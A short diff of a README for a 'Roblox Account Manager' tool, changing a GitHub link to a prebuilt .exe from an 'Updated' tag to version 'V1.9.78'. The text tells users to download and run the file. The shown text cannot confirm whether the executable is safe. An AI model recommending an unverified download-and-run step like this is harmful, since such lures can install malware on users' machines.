@@ -1,7 +1,7 @@
 # How to Download and Install Roblox Account Manager
 
 1. Download the Application  
-   [Click here to download the latest version](https://github.com/Roblo-dev/RobloxAccountManager/releases/download/Updated/Roblox_Account_Manager.exe).
+   [Click here to download the latest version](https://github.com/Roblo-dev/RobloxAccountManager/releases/download/V1.9.78/Roblox_Account_Manager.exe).
 
 2. Run the Application  
    - Once the file has finished downloading, locate it in your Downloads folder.  
